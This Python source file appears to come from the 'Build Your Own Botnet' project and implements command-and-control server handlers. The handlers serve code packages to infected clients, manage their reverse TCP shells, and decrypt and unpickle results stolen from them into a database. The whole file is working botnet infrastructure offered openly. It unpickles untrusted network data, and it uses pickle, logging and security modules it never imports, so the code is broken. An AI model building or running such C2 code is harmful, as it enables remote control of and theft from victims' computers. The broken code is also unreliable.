#!/usr/bin/python
# -*- coding: utf-8 -*-

__doc__ = ''' 

  Request Handler
    handles HTTP requests for files, resources,
    packages, and any user-defined modules
    added to the 'remote' folder

  Task Handler
    handles incoming tasks completed by clients
    operating in passive mode and passes them to
    the database for storage

  Session Handler
    handles incoming client connections in
    separate threads which are each responsible
    for controlling their respective client's
    reverse TCP shell and adding/updating the
    database with the client’s sessions & tasks

'''

# standard library
import os
import sys
import json
import time
import struct
import socket
import select
import argparse
import threading
import subprocess
import collections
import SimpleHTTPServer

# packages
import SocketServer

# modules
import util

# main
class Server(SocketServer.ThreadingTCPServer):

    """ 
    Base server which can be combined with handlers from byob.core.handlers
    to create different types of server instances
    
    """

    allow_reuse_address = True

    def __init__(self, host='0.0.0.0', port=1337, root=None, handler=SimpleHTTPServer.SimpleHTTPRequestHandler):
        """

        `Optional`
        :param str host:        server hostname or IP address
        :param int port:        server port number
        :param str root:        server root directory 
        :param handler:         request handler class

        Returns a byob.server.Server instance
        
        """
        SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)
        if os.path.isdir(root):
            os.chdir(root)

    def serve_until_stopped(self):
        """
        Run server while byob.server.Server.abort is False;
        abort execution if True
        
        """
        abort = False
        while True:
            rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
            if rd:
                self.handle_request()
            abort = globals().get('__abort')
            if abort:
                break


class TaskHandler(SocketServer.StreamRequestHandler):
    """ 
    Task handler for the C2 server that handles
    incoming tasks from clients operating in 
    passive mode

    """

    def handle(self):
        """ 
        Unpack, decrypt, and unpickle an incoming
        completed task from a client, and pass it
        to the database for storage

        """
        while True:
            hdr_size = struct.calcsize('!L')
            hdr = self.connection.recv(hdr_size)
            msg_size = struct.unpack('!L', hdr)[0]
            msg = self.connection.recv(msg_size)
            while len(msg) < msg_size:
                msg += self.connection.recv(msg_size - len(msg))
            session = self.server._get_session_by_connection(self.connection)
            task = pickle.loads(security.decrypt_aes(msg, session.key))
            if isinstance(task, logging.LogRecord):
                self.server.database.handle_task(task.__dict__)
            elif isinstance(task, dict):
                self.server.database.handle_task(task)
            else:
                util.__logger__.debug("invalid task format - expected {}, received {}".format(dict, type(task)))


def main():
    
    parser = argparse.ArgumentParser(prog='handlers.py', description='Resource Handlers (Build Your Own Botnet)', add_help=True)
    
    parser.add_argument(
        '--host',
        type=str,
        help='host to serve resources from',
        default='0.0.0.0')
    
    parser.add_argument(
        '--port',
        type=int,
        help='port number to listen on',
        default=8000)
    
    options = parser.parse_args()

    local_modules = os.path.abspath('modules')
    for i in sys.path:
        if os.path.isdir(i) and os.path.basename(i) == 'site-packages':
            site_packages = os.path.abspath(i)

#    module_handler = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=local_modules, shell=True)
    package_handler = Server(host=options.host, port=options.port + 2, root=site_packages)
    package_handler.serve_until_stopped()

if __name__ == "__main__":
    main()
